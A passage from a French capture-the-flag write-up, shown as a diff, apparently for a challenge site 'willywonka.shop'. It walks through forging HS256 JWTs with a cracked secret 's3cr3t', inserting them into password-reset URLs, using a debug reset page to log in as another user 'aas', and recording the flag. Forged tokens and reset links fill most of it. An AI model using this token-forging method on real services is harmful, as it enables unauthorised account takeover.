@@ -216,3 +216,80 @@ Testing 14344380 passwords...
 ```
 
 > clé secrète : s3cr3t
+
+* celui qu'on veut
+
+> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiYmFja2VuZC53aWxseXdvbmthLnNob3AiLCJpYXQiOjE1NjI2NjQzMTUsImV4cCI6MTU2MjY5NDMxNX0.BLp3k8m-Ll2plrZd2fPmtLrQ9CYYPMJi6nDpcDBgDVg
+
+```json
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+{
+ "sub": "test",
+ "aud": "backend.willywonka.shop",
+ "iat": 1562664315,
+ "exp": 1562694315
+}
+```
+
+> clé secrète : s3cr3t
+
+```
+https://backend.willywonka.shop/reset/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiYmFja2VuZC53aWxseXdvbmthLnNob3AiLCJpYXQiOjE1NjI2NjQzMTUsImV4cCI6MTU2MjY5NDMxNX0.BLp3k8m-Ll2plrZd2fPmtLrQ9CYYPMJi6nDpcDBgDVg
+```
+
+Retour : 
+
+![test pas dans les validateurs](img/test_not_val.png)
+
+
+Faut refaire ma meme avec les validateurs de la page d'accueil du frontend :
+
+* n0wait
+* qsec
+* cybiere
+* meywa
+* itm4n
+* aas
+* xXx_d4rkR0xx0r_xXx
+
+On va prendre aas:
+
+* celui qui marche 
+
+> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2NDMxNSwiZXhwIjoxNTYyNjk0MzE1fQ.6yuVpu_jugKOZL9p9-M-wAF6knpArUJqnfgQzS4W9N4
+
+```json
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+{
+ "sub": "aas",
+ "aud": "backend.willywonka.shop",
+ "iat": 1562664315,
+ "exp": 1562694315
+}
+```
+
+```
+https://backend.willywonka.shop/reset/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2NDMxNSwiZXhwIjoxNTYyNjk0MzE1fQ.6yuVpu_jugKOZL9p9-M-wAF6knpArUJqnfgQzS4W9N4
+```
+
+## Connexion au frontend avec aas
+
+> https://willywonka.shop/reset?debug=1
+
+mettre `aas` et accéder au lien de reset:
+
+```
+https://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJmcm9udGVuZC53aWxseXdvbmthLnNob3AiLCJpYXQiOjE1NjI2NzIwNDcsImV4cCI6MTU2MjY3MjY0N30.6AGXzPFH2lAARZq6LJrJy3XLKua8fMv9uIHO_Bv3P0k
+```
+
+## Flag
+
+Un ticket "deadbeef"
+
+> 7ED33F3EB8E49C5E4BE6B8E2AE270E4018582B27E030D32DE4111DB585EE0318
